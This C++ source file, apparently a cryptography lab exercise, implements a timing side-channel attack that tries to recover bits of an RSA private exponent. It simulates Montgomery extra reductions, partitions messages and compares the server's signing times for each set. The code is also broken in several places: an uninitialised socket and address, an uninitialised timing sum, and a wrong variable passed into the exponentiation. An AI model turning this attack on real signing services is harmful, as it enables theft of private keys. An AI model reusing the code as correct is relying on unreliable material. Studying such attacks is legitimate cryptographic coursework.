#include "attacker.h"
#include <string>
#include <vector>
#include <utility>
#include <tuple>
#include <bitset>


int main(int argc, char *argv[]){
    // Print usage
    if (argc != 6) {
        printf("usage:  ./attacker <host> <port> <number of messages> <d> <index>\n");
        exit(1);
    }
    //Start attack: number of messages, exponent, bit of exponent
    simulate_attack(atoi(argv[3]),atoi(argv[4]),atoi(argv[5]));


    //Attacker attacker(argv[1], atoi(argv[2]));
    //attacker.perform_attack();
    return 0;
}

/*
 * Performs a timing attack on the server
 */
void Attacker::perform_attack(){
    TimedResponse a, b, c;
    a = sign_message("25");
    b = sign_message("30");
    c = sign_message("123123123");

    //std::cout << a << b << c;
}

/*
 * Ask the server to sign @message, recording the time spent by the server.
 */
TimedResponse Attacker::sign_message(const std::string &message){
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}
/*
 * Calculates the modular inverse of a (mod b).
 *
 * http://rosettacode.org/wiki/Modular_inverse#C
 */
num ModInverse(num a, num b){
    num b0 = b, t, q;
    num x0 = 0, x1 = 1;
    if (b == 1) return 1;
    while (a > 1) {
        q = a / b;
        t = b, b = a % b; a = t;
        t = x0, x0 = x1 - q * x0, x1 = t;
    }
    if (x1 < 0) x1 += b0;
    return x1;
}
/*
 * Ccounts the number of bits required to represent a decimal number
 */
long numBits(const num &n){
    ttmath::Big<32,32> k;
    k.Log(n, 2);
    k = ttmath::Floor(k);
    return k.ToInt() + 1;
}

/*
 * Calculates r^{-1} and n' as used in Montgomery exponentiation,
 * as well as the number of bits in n.
 */
num nPrime(num n, num r){
    num rInverse = ModInverse(r, n);
    return (r*rInverse - 1)/n;
}

bool ModExp(const num &M, const num &d, const num &n,int index){
    if (n%2 != 1) {
        std::cout << "Warning! Exponentiation failed. Modulus must be odd!";
        return 0;
    }
    num r, nprime;
    r = 2;
    r.Pow(numBits(n));

    num n_prime = nPrime(n, r);
    num M_bar = (M * r) % n;
    num x_bar = r%n;
    bool v,v2,finalBoolean;
    long k = numBits(d) - 1; // Loop over bit indices. [0, k-1]
    //std::cout << d << " d " << r << " r " << n_prime << " n_prime " << M_bar << " M_bar " << x_bar << " x_bar "<< "\n"; 
    for (; k >= 0 ; k--) {
        std::tie(x_bar,v2) = MontgomeryProduct(x_bar, x_bar, nprime, r, n);
        if(k==index){
            finalBoolean = v2;
        }
        if (d.GetBit(k)){
            std::tie(x_bar,v) = MontgomeryProduct(M_bar, x_bar, nprime, r, n);
            if(k==index){
                finalBoolean = v;
            }
        }
    }
    return finalBoolean;
}


std::pair<num, bool> MontgomeryProduct(const num &a, const num &b, const num &nprime, const num &r, const num &n){
    num t = a * b;
    num m = t * nprime % r;
    num u = (t + m*n)/r;
    if(u >=n) {
            return std::make_pair(u-n,true);
    }
    else {
            return std::make_pair(u,false); }
}


TimedResponse sign_message2(const std::string &message){
    int sock;
    int server_addr;
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}

std::string binary(unsigned x)
{
    // warning: this breaks for numbers with more than 64 bits
    char buffer[64];
    char* p = buffer + 64;
    do
    {
        *--p = '0' + (x & 1);
    } while (x >>= 1);
    return std::string(p, buffer + 64);
}

/*
*  Divide messages into two list.
*/
void simulate_attack(int number_messages,int exponent,int index) {
    std::string b = binary(exponent);
    std::cout<<"Trying exponent:"<<exponent<<"\n"<<"Bit rep:"<<b<<"\n"<<"Attacking bit number:"<<index<<"\n";
    //The two sets
    std::vector<int> set_one;
    std::vector<int> set_two;

    //Simulate messages
    std::cout<<"Simulate signatures locally..."<<"\n";
    for( int i = 0; i < number_messages; i = i + 1 )
    {   
        int random = rand() % 100 + 1;

        bool v = ModExp(random,exponent,9991,index);
        if(v){
            set_one.push_back(random);
        }
        else{
            set_two.push_back(random);
        }
    }
    std::cout << "Size of set one: " << int(set_one.size()) << '\n';
    std::cout << "Size of set two: " << int(set_two.size()) << '\n';
    std::cout<<"\n";std::cout<<"\n";

    
    /*
    * Calculate mean time for each set
    */
    std::cout<<"Requsting signatures from server..."<<"\n";
    int t1,t2 = 0;
    for( int i = 0; i < set_one.size(); i = i + 1 ){
        TimedResponse t;
        t = sign_message2(std::to_string(set_one.at(i)));
        t1+=t.duration.count();
    }

    for( int i = 0; i < set_two.size(); i = i + 1 ){
        TimedResponse t;
        t = sign_message2(std::to_string(set_two.at(i)));
        t2+=t.duration.count();
    }
    t1 = t1/set_one.size();
    t2 = t2/set_two.size();
    
    std::cout<<"Average time set one:"<<t1<<"\n";
    std::cout<<"Average time set two:"<<t2<<"\n";
    std::cout<<"Ratio:"<<((t1*1.0)/t2) <<"\n";
}